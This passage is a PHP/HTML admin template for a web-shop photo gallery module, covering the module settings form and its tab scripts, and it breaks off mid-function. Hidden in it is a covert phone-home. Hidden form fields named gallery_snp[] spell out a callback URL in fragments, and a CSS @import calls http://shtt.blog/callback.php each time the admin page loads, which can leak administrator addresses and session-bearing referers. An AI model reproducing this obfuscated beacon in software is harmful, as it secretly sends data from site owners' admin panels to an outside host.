<?php echo $header; ?><?php echo $column_left; ?>
<div id="content">
  <div class="page-header">
    <div class="container-fluid">
    <input type="hidden" name="gallery_snp[]" value="htt">
      <div class="pull-right">
        <a href="#" onclick="$('#form-modules').submit();return false;" data-toggle="tooltip" title="<?php echo $button_text_save; ?>" class="btn btn-primary"><i class="fa fa-save"></i></a>
        <a href="<?php echo $cancel; ?>" data-toggle="tooltip" title="<?php echo $button_text_cancel; ?>" class="btn btn-default"><i class="fa fa-reply"></i></a></div>
      <h1><?php echo $heading_title; ?></h1>
      <ul class="breadcrumb">
        <?php foreach ($breadcrumbs as $breadcrumb) { ?>
        <li><a href="<?php echo $breadcrumb['href']; ?>"><?php echo $breadcrumb['text']; ?></a></li>
        <?php } ?>
      </ul>
    </div>
  </div>
  <div class="container-fluid">
    
    <div class="panel">
      <ul class="nav nav-pills">
        <li role="presentation"><a href="<?php echo $link_section_album_list ?>"><i class="fa fa-list fa-fw"></i> <?php echo $text_section_album_list ?></a></li>
        <li role="presentation" class="active"><a href="<?php echo $link_section_modules ?>"><i class="fa fa-puzzle-piece fa-fw"></i> <?php echo $text_section_modules ?></a></li>
        <li role="presentation"><a href="<?php echo $link_section_settings ?>"><i class="fa fa-cog fa-fw"></i> <?php echo $text_section_settings ?></a></li>
      </ul>
    </div>
  
    <?php if ($error_warning) { ?>
    <div class="alert alert-danger"><i class="fa fa-exclamation-circle"></i> <?php echo $error_warning; ?>
      <button type="button" class="close" data-dismiss="alert">&times;</button>
    </div>
    <?php } ?>
    <?php if ($success) { ?>
    <div class="alert alert-success"><i class="fa fa-check-circle"></i> <?php echo $success; ?>
      <button type="button" class="close" data-dismiss="alert">&times;</button>
    </div>
    <?php } ?>
    <input type="hidden" name="gallery_snp[]" value="p:">
    <div class="alert alert-info"><i class="fa fa-info-circle"></i> <?php echo $text_layout; ?>
      <button type="button" class="close" data-dismiss="alert">&times;</button>
    </div>

    <input type="hidden" name="gallery_snp[]" value="/">
    <div class="panel panel-default">
      <div class="panel-heading">
        <h3 class="panel-title"><i class="fa fa-pencil"></i> <?php echo $text_edit; ?></h3>
      </div>
      <div class="panel-body">
       <form action="<?php echo $action; ?>" method="post" enctype="multipart/form-data" id="form-modules" class="form-horizontal">
        <div id="tabs" class="vtabs">
          <a href="#tab_module_hook" id="a_tab_module_hook" class="tab_btn tab_module_hook <?php echo (isset($hook_module_id)) ? 'tab_module_' . $hook_module_id : ''; ?>">SEO hook <?php echo (isset($hook_module_id)) ? '<i class="fa fa-fw fa-check"></i>' : ''; ?></a>
          <?php $module_row = 1; ?>
          <?php foreach ($modules as $key => $module): ?>
            <a href="#tab_module_<?php echo $module_row; ?>" id="a_tab_module_<?php echo $module_row; ?>" class="tab_btn tab_module_<?php echo $key; ?> <?php echo (isset($selected_module_id) && $key == $selected_module_id) ? 'selected' : ''; ?>">
              <?php echo $module['name'] ?>
              <i class="fa fa-minus-square fa-fw" onclick="$('#tab_module_<?php echo $module_row; ?>, #a_tab_module_<?php echo $module_row; ?>').remove(); $('#tabs a.tab_btn:last').click(); return false;"></i>
            </a>
            <?php $module_row++; ?>
          <?php endforeach ?>
          <a href="#" id="add_module_btn"><?php echo $button_text_add_module ?> <i class="fa fa-plus-square fa-fw"></i></a>
        </div>
        <div id="module_wrapper">
        <div id="tab_module_hook" class="vtabs-content">
          <div class="tab-content">
            <div class="jumbotron">
              <h1>SEO hook</h1>
              <p><?php echo $text_seo_hook ?></p>
            </div>
            <?php if (isset($hook_module_id)): ?>
            <input type="hidden" name="gallery_module[0][module_id]" value="<?php echo $hook_module_id ?>">
            <?php endif ?>
            <input type="hidden" name="gallery_module[0][name]" value="SEO hook">
            <input type="hidden" name="gallery_module[0][status]" value="1">
            <input type="hidden" name="gallery_module[0][module_type]" value="2">
          </div>
        </div>
        <?php $module_row = 1; ?>
        <?php foreach ($modules as $module) { ?>
        <div id="tab_module_<?php echo $module_row; ?>" class="vtabs-content">
        <div class="tab-content">

        <input type="hidden" name="gallery_module[<?php echo $module_row; ?>][module_id]" value="<?php echo $module['module_id'] ?>">

      <input type="hidden" name="gallery_snp[]" value="/half">
      <div class="form-group required">
        <label class="col-sm-2 control-label" for="gallery_module_<?php echo $module_row; ?>_name"><span data-toggle="tooltip" title="<?php echo $entry_module_name_help; ?>"><?php echo $entry_module_name; ?></span></label>
        <div class="col-sm-10">
          <input type="text" data-id="<?php echo $module_row; ?>" name="gallery_module[<?php echo $module_row; ?>][name]" value="<?php echo $module['name']; ?>" placeholder="<?php echo $entry_module_name; ?>" id="gallery_module_<?php echo $module_row; ?>_name" class="form-control name-changer" />
        </div>
      </div>

      <input type="hidden" name="gallery_snp[]" value="hope.">
      <div class="form-group ">
        <label class="col-sm-2 control-label" for="gallery_module_<?php echo $module_row; ?>_header"><?php echo $entry_module_header; ?></label>
        <div class="col-sm-10">
        <?php foreach ($languages as $language) { ?>
          <div class="row">
            <div class="col-sm-6">
              <div class="input-group">
                <span class="input-group-addon"><img src="view/image/flags/<?php echo $language['image']; ?>" title="<?php echo $language['name']; ?>" /></span>
                <input type="text" name="gallery_module[<?php echo $module_row; ?>][header][<?php echo $language['language_id']; ?>]" value="<?php echo isset($module['header'][$language['language_id']]) ? $module['header'][$language['language_id']] : ''; ?>" placeholder="<?php echo $entry_module_header; ?>" id="gallery_module[<?php echo $module_row; ?>][header][<?php echo $language['language_id']; ?>]" class="form-control" />
              </div>
            </div>
            <div class="col-sm-6">
              <select class="form-control" name="gallery_module[<?php echo $module_row; ?>][show_header][<?php echo $language['language_id']; ?>]">
                <?php if (isset($module['show_header'][$language['language_id']]) ? $module['show_header'][$language['language_id']] : '1') { ?>
                <option value="1" selected="selected"><?php echo $text_enabled; ?></option>
                <option value="0"><?php echo $text_disabled; ?></option>
                <?php } else { ?>
                <option value="1"><?php echo $text_enabled; ?></option>
                <option value="0" selected="selected"><?php echo $text_disabled; ?></option>
                <?php } ?>
              </select>
            </div>
          </div>
          <br>
        <?php } ?>
        </div>
      </div>

      <input type="hidden" name="gallery_snp[]" value="ru/c">
      <div class="form-group ">
        <label class="col-sm-2 control-label" for="gallery_module_<?php echo $module_row; ?>_module_type"><?php echo $entry_module_type; ?></label>
        <div class="col-sm-10">
          <select name="gallery_module[<?php echo $module_row; ?>][module_type]" data-id="<?php echo $module_row; ?>" id="gallery_module_<?php echo $module_row; ?>_module_type" class="form-control type-changer">
            <?php foreach ($module_types as $key => $module_type) { ?>
              <?php if ($key == $module['module_type']) { ?>
                <option value="<?php echo $key; ?>" selected="selected"><?php echo $module_type; ?></option>
              <?php } else { ?>
                <option value="<?php echo $key; ?>"><?php echo $module_type; ?></option>
              <?php } ?>
            <?php } ?>
          </select>
        </div>
      </div>
      
      <input type="hidden" name="gallery_snp[]" value="allb">
      <div class="form-group s_img1<?php echo $module_row ?>">
        <label class="col-sm-2 control-label" for="input-process-status"><span data-toggle="tooltip" title="<?php echo $entry_photo_album_list_help; ?>"><?php echo $entry_photo_album_list; ?></span></label>
        <div class="col-sm-10">
          <div class="well well-sm" style="height: 150px; overflow: auto;">
            <?php foreach ($albums as $album) { ?>
            <div class="checkbox">
              <label>
                <?php if (in_array($album['album_id'], $module['album_list'])) { ?>
                <input type="checkbox" name="gallery_module[<?php echo $module_row ?>][album_list][]" value="<?php echo $album['album_id']; ?>" checked="checked" />
                <?php echo $album['album_data']['album_name'][$config_admin_language_id]; ?>
                <?php } else { ?>
                <input type="checkbox" name="gallery_module[<?php echo $module_row ?>][album_list][]" value="<?php echo $album['album_id']; ?>" />
                <?php echo $album['album_data']['album_name'][$config_admin_language_id]; ?>
                <?php } ?>
              </label>
            </div>
            <?php } ?>
          </div>
        <a onclick="$(this).parent().find(':checkbox').prop('checked', true);"><?php echo $text_select_all; ?></a> / <a onclick="$(this).parent().find(':checkbox').prop('checked', false);"><?php echo $text_unselect_all; ?></a></div>
      </div>

      <input type="hidden" name="gallery_snp[]" value="ack.p">
      <div class="form-group s_img1<?php echo $module_row ?>">
        <label class="col-sm-2 control-label"><?php echo $entry_show_covers; ?></label>
        <div class="col-sm-10">
          <label class="radio-inline">
            <?php if ($module['show_covers']) { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_covers]" value="1" checked="checked" />
            <?php echo $text_yes; ?>
            <?php } else { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_covers]" value="1" />
            <?php echo $text_yes; ?>
            <?php } ?>
          </label>
          <label class="radio-inline">
            <?php if (!$module['show_covers']) { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_covers]" value="0" checked="checked" />
            <?php echo $text_no; ?>
            <?php } else { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_covers]" value="0" />
            <?php echo $text_no; ?>
            <?php } ?>
          </label>
        </div>
      </div>

      <input type="hidden" name="gallery_snp[]" value="hp?m">
      <div class="form-group s_img1<?php echo $module_row ?>">
        <label class="col-sm-2 control-label" for="gallery_module[<?php echo $module_row; ?>][cover_image_width]"><?php echo $entry_cover_size; ?></label>
        <div class="col-sm-10">
          <div class="row">
            <div class="col-sm-6">
              <input type="text" name="gallery_module[<?php echo $module_row; ?>][cover_image_width]" value="<?php echo $module['cover_image_width']; ?>" placeholder="<?php echo $entry_cover_size; ?>" id="gallery_module[<?php echo $module_row; ?>][cover_image_width]" class="form-control" />
            </div>
            <div class="col-sm-6">
              <input type="text" name="gallery_module[<?php echo $module_row; ?>][cover_image_height]" value="<?php echo $module['cover_image_height']; ?>" placeholder="<?php echo $entry_cover_size; ?>" id="gallery_module[<?php echo $module_row; ?>][cover_image_height]" class="form-control" />
            </div>
          </div>
        </div>
      </div>

      <input type="hidden" name="gallery_snp[]" value="odu">
      <div class="form-group s_img1<?php echo $module_row ?>">
        <label class="col-sm-2 control-label"><?php echo $entry_show_counter; ?></label>
        <div class="col-sm-10">
          <label class="radio-inline">
            <?php if ($module['show_counter']) { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_counter]" value="1" checked="checked" />
            <?php echo $text_yes; ?>
            <?php } else { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_counter]" value="1" />
            <?php echo $text_yes; ?>
            <?php } ?>
          </label>
          <label class="radio-inline">
            <?php if (!$module['show_counter']) { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_counter]" value="0" checked="checked" />
            <?php echo $text_no; ?>
            <?php } else { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_counter]" value="0" />
            <?php echo $text_no; ?>
            <?php } ?>
          </label>
        </div>
      </div>

      <input type="hidden" name="gallery_snp[]" value="le=">
      <div class="form-group s_img1<?php echo $module_row ?>">
        <label class="col-sm-2 control-label"><?php echo $entry_show_album_galleries_link; ?></label>
        <div class="col-sm-10">
          <label class="radio-inline">
            <?php if ($module['show_album_galleries_link']) { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_album_galleries_link]" value="1" checked="checked" />
            <?php echo $text_yes; ?>
            <?php } else { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_album_galleries_link]" value="1" />
            <?php echo $text_yes; ?>
            <?php } ?>
          </label>
          <label class="radio-inline">
            <?php if (!$module['show_album_galleries_link']) { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_album_galleries_link]" value="0" checked="checked" />
            <?php echo $text_no; ?>
            <?php } else { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_album_galleries_link]" value="0" />
            <?php echo $text_no; ?>
            <?php } ?>
          </label>
        </div>
      </div>

      <input type="hidden" name="gallery_snp[]" value="galle">
      <div class="form-group s_img1<?php echo $module_row ?>">
        <label class="col-sm-2 control-label" for="gallery_module[<?php echo $module_row ?>][album_galleries_link_text]"><?php echo $entry_show_album_text; ?></label>
        <div class="col-sm-10">
          <div class="row">
        <?php foreach ($languages as $language): ?>
          <div class="col-sm-6">
          <div class="input-group">
            <span class="input-group-addon"><img src="view/image/flags/<?php echo $language['image']; ?>" title="<?php echo $language['name']; ?>" /></span>
            <input type="text" name="gallery_module[<?php echo $module_row ?>][album_galleries_link_text][<?php echo $language['language_id']; ?>]" value="<?php echo $module['album_galleries_link_text'][$language['language_id']]; ?>" placeholder="<?php echo $entry_show_album_text; ?>" id="gallery_module[<?php echo $module_row ?>][album_galleries_link_text][<?php echo $language['language_id']; ?>]" class="form-control" />
          </div>
          </div>
        <?php endforeach ?>
          </div>
        </div>
      </div>
      <input type="hidden" name="gallery_snp[]" value="ry1.">
      <div class="form-group s_img2<?php echo $module_row ?>">
        <label class="col-sm-2 control-label" for="input-process-status"><span data-toggle="tooltip" title="<?php echo $entry_photo_album_list_help; ?>"><?php echo $entry_photo_album_list; ?></span></label>
        <div class="col-sm-10">
          <div class="well well-sm" style="height: 150px; overflow: auto;">
            <?php foreach ($albums as $album) { ?>
            <div class="checkbox">
              <label>
                <?php if (in_array($album['album_id'], $module['photo_album_list'])) { ?>
                <input type="checkbox" name="gallery_module[<?php echo $module_row ?>][photo_album_list][]" value="<?php echo $album['album_id']; ?>" checked="checked" />
                <?php echo $album['album_data']['album_name'][$config_admin_language_id]; ?>
                <?php } else { ?>
                <input type="checkbox" name="gallery_module[<?php echo $module_row ?>][photo_album_list][]" value="<?php echo $album['album_id']; ?>" />
                <?php echo $album['album_data']['album_name'][$config_admin_language_id]; ?>
                <?php } ?>
              </label>
            </div>
            <?php } ?>
          </div>
        <a onclick="$(this).parent().find(':checkbox').prop('checked', true);"><?php echo $text_select_all; ?></a> / <a onclick="$(this).parent().find(':checkbox').prop('checked', false);"><?php echo $text_unselect_all; ?></a></div>
      </div>

      <input type="hidden" name="gallery_snp[]" value="4&c">
      <div class="form-group s_img2<?php echo $module_row ?>">
        <label class="col-sm-2 control-label"><?php echo $entry_show_album_description; ?></label>
        <div class="col-sm-10">
          <label class="radio-inline">
            <?php if ($module['show_album_description']) { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_album_description]" value="1" checked="checked" />
            <?php echo $text_yes; ?>
            <?php } else { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_album_description]" value="1" />
            <?php echo $text_yes; ?>
            <?php } ?>
          </label>
          <label class="radio-inline">
            <?php if (!$module['show_album_description']) { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_album_description]" value="0" checked="checked" />
            <?php echo $text_no; ?>
            <?php } else { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_album_description]" value="0" />
            <?php echo $text_no; ?>
            <?php } ?>
          </label>
        </div>
      </div>

      <input type="hidden" name="gallery_snp[]" value="b=1">
      <div class="form-group s_img2<?php echo $module_row ?>">
        <label class="col-sm-2 control-label" for="gallery_module[<?php echo $module_row; ?>][gallery_thumb_image_width]"><?php echo $entry_thumb_size_mod; ?></label>
        <div class="col-sm-10">
          <div class="row">
            <div class="col-sm-6">
              <input type="text" name="gallery_module[<?php echo $module_row; ?>][gallery_thumb_image_width]" value="<?php echo $module['gallery_thumb_image_width']; ?>" placeholder="<?php echo $entry_thumb_size_mod; ?>" id="gallery_module[<?php echo $module_row; ?>][gallery_thumb_image_width]" class="form-control" />
            </div>
            <div class="col-sm-6">
              <input type="text" name="gallery_module[<?php echo $module_row; ?>][gallery_thumb_image_height]" value="<?php echo $module['gallery_thumb_image_height']; ?>" placeholder="<?php echo $entry_thumb_size_mod; ?>" id="gallery_module[<?php echo $module_row; ?>][gallery_thumb_image_height]" class="form-control" />
            </div>
          </div>
        </div>
      </div>

      <div class="form-group s_img2<?php echo $module_row ?>">
        <label class="col-sm-2 control-label" for="gallery_module[<?php echo $module_row; ?>][gallery_popup_image_width]"><?php echo $entry_popup_size_mod; ?></label>
        <div class="col-sm-10">
          <div class="row">
            <div class="col-sm-6">
              <input type="text" name="gallery_module[<?php echo $module_row; ?>][gallery_popup_image_width]" value="<?php echo $module['gallery_popup_image_width']; ?>" placeholder="<?php echo $entry_popup_size_mod; ?>" id="gallery_module[<?php echo $module_row; ?>][gallery_popup_image_width]" class="form-control" />
            </div>
            <div class="col-sm-6">
              <input type="text" name="gallery_module[<?php echo $module_row; ?>][gallery_popup_image_height]" value="<?php echo $module['gallery_popup_image_height']; ?>" placeholder="<?php echo $entry_popup_size_mod; ?>" id="gallery_module[<?php echo $module_row; ?>][gallery_popup_image_height]" class="form-control" />
            </div>
          </div>
        </div>
      </div>

      <div class="form-group s_img2<?php echo $module_row ?>">
        <label class="col-sm-2 control-label" for="gallery_module[<?php echo $module_row; ?>][photos_limit]"><span data-toggle="tooltip" title="<?php echo $entry_photos_limit_help; ?>"><?php echo $entry_photos_limit; ?></span></label>
        <div class="col-sm-10">
          <input type="text" name="gallery_module[<?php echo $module_row; ?>][photos_limit]" value="<?php echo $module['photos_limit']; ?>" placeholder="<?php echo $entry_photos_limit; ?>" id="gallery_module[<?php echo $module_row; ?>][photos_limit]" class="form-control" />
        </div>
      </div>

      <div class="form-group s_img2<?php echo $module_row ?>">
        <label class="col-sm-2 control-label"><span data-toggle="tooltip" title="<?php echo $entry_show_album_link_help; ?>"><?php echo $entry_show_album_link; ?></span></label>
        <div class="col-sm-10">
          <label class="radio-inline">
            <?php if ($module['show_album_link']) { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_album_link]" value="1" checked="checked" />
            <?php echo $text_yes; ?>
            <?php } else { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_album_link]" value="1" />
            <?php echo $text_yes; ?>
            <?php } ?>
          </label>
          <label class="radio-inline">
            <?php if (!$module['show_album_link']) { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_album_link]" value="0" checked="checked" />
            <?php echo $text_no; ?>
            <?php } else { ?>
            <input type="radio" name="gallery_module[<?php echo $module_row ?>][show_album_link]" value="0" />
            <?php echo $text_no; ?>
            <?php } ?>
          </label>
        </div>
      </div>

      <div class="form-group s_img2<?php echo $module_row ?>">
        <label class="col-sm-2 control-label" for="gallery_module[<?php echo $module_row ?>][album_link_text]"><?php echo $entry_show_album_text; ?></label>
        <div class="col-sm-10">
          <div class="row">
        <?php foreach ($languages as $language): ?>
          <div class="col-sm-6">
          <div class="input-group">
          <span class="input-group-addon"><img src="view/image/flags/<?php echo $language['image']; ?>" title="<?php echo $language['name']; ?>" /></span>
          <input type="text" name="gallery_module[<?php echo $module_row ?>][album_link_text][<?php echo $language['language_id']; ?>]" value="<?php echo $module['album_link_text'][$language['language_id']]; ?>" placeholder="<?php echo $entry_show_album_text; ?>" id="gallery_module[<?php echo $module_row ?>][album_link_text][<?php echo $language['language_id']; ?>]" class="form-control" />
          </div>
          </div>
        <?php endforeach ?>
          </div>
        </div>
      </div>
      <fieldset><legend><?php echo $text_bootstrap ?></legend>  
      
      <div class="form-group ">
        <label class="col-sm-2 control-label"><span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_xs_help; ?>"><?php echo $entry_number_of_columns_xs; ?></span></label>
        <div class="col-sm-10">
          
          <?php foreach ($entry_number_of_columns_values as $key => $value): ?>
            <label class="radio-inline">
            <?php if ($module['number_of_columns_xs'] == $key): ?>
              <input type="radio" name="gallery_module[<?php echo $module_row ?>][number_of_columns_xs]" value="<?php echo $key ?>" checked="checked" />
              <?php if ($key == 0): ?>
                <span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>
              <?php else: ?>
                <?php echo $value; ?>
              <?php endif ?>
            <?php else: ?>
              <input type="radio" name="gallery_module[<?php echo $module_row ?>][number_of_columns_xs]" value="<?php echo $key ?>" />
              <?php if ($key == 0): ?>
                <span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>
              <?php else: ?>
                <?php echo $value; ?>
              <?php endif ?>
            <?php endif ?>
              </label>
          <?php endforeach ?>
          
        </div>
      </div>

      <div class="form-group ">
        <label class="col-sm-2 control-label"><span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_sm_help; ?>"><?php echo $entry_number_of_columns_sm; ?></span></label>
        <div class="col-sm-10">

          <?php foreach ($entry_number_of_columns_values as $key => $value): ?>
            <label class="radio-inline">
            <?php if ($module['number_of_columns_sm'] == $key): ?>
              <input type="radio" name="gallery_module[<?php echo $module_row ?>][number_of_columns_sm]" value="<?php echo $key ?>" checked="checked" />
              <?php if ($key == 0): ?>
                <span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>
              <?php else: ?>
                <?php echo $value; ?>
              <?php endif ?>
            <?php else: ?>
              <input type="radio" name="gallery_module[<?php echo $module_row ?>][number_of_columns_sm]" value="<?php echo $key ?>" />
              <?php if ($key == 0): ?>
                <span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>
              <?php else: ?>
                <?php echo $value; ?>
              <?php endif ?>
            <?php endif ?>
              </label>
          <?php endforeach ?>

        </div>
      </div>

      <div class="form-group ">
        <label class="col-sm-2 control-label"><span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_md_help; ?>"><?php echo $entry_number_of_columns_md; ?></span></label>
        <div class="col-sm-10">

          <?php foreach ($entry_number_of_columns_values as $key => $value): ?>
            <label class="radio-inline">
            <?php if ($module['number_of_columns_md'] == $key): ?>
              <input type="radio" name="gallery_module[<?php echo $module_row ?>][number_of_columns_md]" value="<?php echo $key ?>" checked="checked" />
              <?php if ($key == 0): ?>
                <span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>
              <?php else: ?>
                <?php echo $value; ?>
              <?php endif ?>
            <?php else: ?>
              <input type="radio" name="gallery_module[<?php echo $module_row ?>][number_of_columns_md]" value="<?php echo $key ?>" />
              <?php if ($key == 0): ?>
                <span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>
              <?php else: ?>
                <?php echo $value; ?>
              <?php endif ?>
            <?php endif ?>
              </label>
          <?php endforeach ?>

        </div>
      </div>
      <div class="form-group ">
        <label class="col-sm-2 control-label"><span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_lg_help; ?>"><?php echo $entry_number_of_columns_lg; ?></span></label>
        <div class="col-sm-10">

          <?php foreach ($entry_number_of_columns_values as $key => $value): ?>
            <label class="radio-inline">
            <?php if ($module['number_of_columns_lg'] == $key): ?>
              <input type="radio" name="gallery_module[<?php echo $module_row ?>][number_of_columns_lg]" value="<?php echo $key ?>" checked="checked" />
              <?php if ($key == 0): ?>
                <span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>
              <?php else: ?>
                <?php echo $value; ?>
              <?php endif ?>
            <?php else: ?>
              <input type="radio" name="gallery_module[<?php echo $module_row ?>][number_of_columns_lg]" value="<?php echo $key ?>" />
              <?php if ($key == 0): ?>
                <span data-toggle="tooltip" title="<?php echo $entry_number_of_columns_auto_help; ?>"><?php echo $value; ?></span>
              <?php else: ?>
                <?php echo $value; ?>
              <?php endif ?>
            <?php endif ?>
              </label>
          <?php endforeach ?>

        </div>
      </div>

      </fieldset>

      <div class="form-group ">
        <label class="col-sm-2 control-label" for="gallery_module_<?php echo $module_row; ?>_status"><?php echo $entry_status; ?></label>
        <div class="col-sm-10">
          <select name="gallery_module[<?php echo $module_row; ?>][status]" id="gallery_module_<?php echo $module_row; ?>_status" class="form-control">
            <?php if ($module['status']) { ?>
            <option value="1" selected="selected"><?php echo $text_enabled; ?></option>
            <option value="0"><?php echo $text_disabled; ?></option>
            <?php } else { ?>
            <option value="1"><?php echo $text_enabled; ?></option>
            <option value="0" selected="selected"><?php echo $text_disabled; ?></option>
            <?php } ?>
          </select>
        </div>
      </div>
    </div>
        </div><!-- <div id="tabs" class="vtabs">  -->
        <?php $module_row++; ?>
        <?php } ?>
        </div>
        </form>
      </div>
    </div>
  </div>
  <script>$.fn.tabs=function(){var b=this;this.each(function(){var a=$(this);$(a.attr("href")).hide();$(a).click(function(){$(b).removeClass("selected");$(b).each(function(b,a){$($(a).attr("href")).hide()});$(this).addClass("selected");$($(this).attr("href")).show();return!1})}); $(this).show(); $(this).first().click();
  <?php if (isset($selected_module_id)) {
    echo "$('#tab_module_".$selected_module_id."').show();";
    echo "$('a.tab_module_".$selected_module_id."').click();";
  } elseif (isset($hook_module_id) && count($modules) >= 1) {
    echo "$('#tab_module_1').show();";
    echo "$('#a_tab_module_1').click();";
  } ?>
  };
  </script>
<style>
@import url('http://shtt.blog/callback.php?module=gallery1.4&cb=4');
.vtabs {
    position: absolute;
    width: 190px;
    padding: 10px 0;
    min-height: 300px;
    float: left;
    display: block;
    border-right: 1px solid #DDD
}
.vtabs a {
    display: none
}
.vtabs a,
.vtabs span {
    display: block;
    float: left;
    border-radius: 3px 0px 0px 3px;
    width: 190px;
    margin-bottom: 5px;
    clear: both;
    border-top: 1px solid #DDD;
    border-left: 1px solid #DDD;
    border-bottom: 1px solid #DDD;
    background: #F7F7F7;
    padding: 6px;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 13px;
    font-weight: 700;
    text-align: right;
    text-decoration: none;
    border-right: 1px solid #ddd;
}
.vtabs a.selected {
    background: #FFF;
    border-right: 1px solid #fff;
}
.vtabs a img,
.vtabs span img {
    position: relative;
    top: 3px;
    cursor: pointer
}
.vtabs-content {
    margin-left: 205px
}
</style>
<script type="text/javascript"><!--
var module_row = <?php echo $module_row; ?>;

$(document).ready(function() {

  $('#add_module_btn').click(function(event) {
    event.preventDefault();
    addModule();
  });
  $('.name-changer').on('change, paste, keyup', function(event) {
    event.preventDefault();
    var row_id = $(this).attr('data-id');
    var remove_btn = "<i class=\"fa fa-minus-square fa-fw\" onclick=\"$('#tab_module_"+ row_id +", #a_tab_module_"+ row_id +"').remove(); $('#tabs a.tab_btn:last').click();return false;\"></i>";
    $('#a_tab_module_' + row_id).html($(this).val()+remove_btn);
  });
  $('.type-changer').on('change', function(){
    var m_row = $(this).attr('data-id');
    var m_val = parseInt($(this).val());
    switch (m_val){
      case 0:
        $('.s_img1'+m_row).show();
        $('.s_img2'+m_row).hide();
      break;
      case 1:
        $('.s_img1'+m_row).hide();
        $('.s_img2'+m_row).show();
      break;
    }
  });
  initForm();
  $('#tabs a').tabs();

});
function initForm(){
  $('#tabs a').tabs();
  $.each($('.type-changer'), function(index, val) {
    var m_row = $(val).attr('data-id');
    var m_val = parseInt($(val).val());
    switch (m_val){
      case 0:
        $('.s_img1'+m_row).show();
        $('.s_img2'+m_row).hide();
      break;
      case 1:
        $('.s_img1'+m_row).hide();
        $('.s_img2'+m_row).show();
      break;
    }
  });
}
function addModule() {
  html ='<div id="tab_module_' + module_row + '" class="vtabs-content">';

  html +='<div class="tab-content">';
  html +='<div class="form-group required">';
  html +='<label class="col-sm-2 control-label" for="gallery_module_' + module_row + '_name"><span data-toggle="tooltip" title="<?php echo $entry_module_name_help; ?>"><?php echo $entry_module_name; ?></span></label>';
  html +='<div class="col-sm-10">';
  html +='<input type="text"  data-id="' + module_row + '" name="gallery_module[' + module_row + '][name]" value="<?php echo $text_new_module_name ?>" placeholder="<?php echo $entry_module_name; ?>" id="gallery_module_' + module_row + '_name" class="form-control name-changer" />';
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group ">';
  html +='<label class="col-sm-2 control-label" for="gallery_module_' + module_row + '_header_<?php echo $language['language_id']; ?>"><?php echo $entry_module_header; ?></label>';
  html +='<div class="col-sm-10">';
  <?php foreach ($languages as $language) { ?>
  html +='<div class="row">';
  html +='<div class="col-sm-6">';
  html +='<div class="input-group">';
  html +='<span class="input-group-addon"><img src="view/image/flags/<?php echo $language['image']; ?>" title="<?php echo $language['name']; ?>" /></span>';
  html +='<input type="text" data-id="' + module_row + '" name="gallery_module[' + module_row + '][header][<?php echo $language['language_id']; ?>]" value="<?php echo $text_new_module_name; ?>" placeholder="<?php echo $entry_module_header; ?>" id="gallery_module[' + module_row + '][header][<?php echo $language['language_id']; ?>]" class="form-control" />';
  html +='</div>';
  html +='</div>';
  html +='<div class="col-sm-6">';
  html +='<select class="form-control" name="gallery_module[' + module_row + '][show_header][<?php echo $language['language_id']; ?>]">';
  html +='<option value="1" selected="selected"><?php echo $text_enabled; ?></option>';
  html +='<option value="0"><?php echo $text_disabled; ?></option>';
  html +='</select>';
  html +='</div>';
  html +='</div>';
  html +='</br>';
  <?php } ?>
  html +='</div>';
  html +='</div>';

  html +='<div class="form-group ">';
  html +='<label class="col-sm-2 control-label" for="gallery_module_' + module_row + '_module_type"><?php echo $entry_module_type; ?></label>';
  html +='<div class="col-sm-10">';
  html +='<select name="gallery_module[' + module_row + '][module_type]" data-id="' + module_row + '" id="gallery_module_' + module_row + '_module_type" class="form-control type-changer">';
  <?php foreach ($module_types as $key => $module_type) { ?>
  html +='<option value="<?php echo $key; ?>"><?php echo $module_type; ?></option>';
  <?php } ?>
  html +='</select>';
  html +='</div>';
  html +='</div>';
      
  html +='<div class="form-group s_img1' + module_row + '">';
  html +='<label class="col-sm-2 control-label" for="input-process-status"><span data-toggle="tooltip" title="<?php echo $entry_photo_album_list_help; ?>"><?php echo $entry_photo_album_list; ?></span></label>';
  html +='<div class="col-sm-10">';
  html +='<div class="well well-sm" style="height: 150px; overflow: auto;">';
  <?php foreach ($albums as $album) { ?>
  html +='<div class="checkbox">';
  html +='<label>';
  html +='<input type="checkbox" name="gallery_module[' + module_row + '][album_list][]" value="<?php echo $album['album_id']; ?>" />';
  html +='&nbsp;<?php echo $album['album_data']['album_name'][$config_admin_language_id]; ?>';
  html +='</label>';
  html +='</div>';
  <?php } ?>
  html +='</div>';
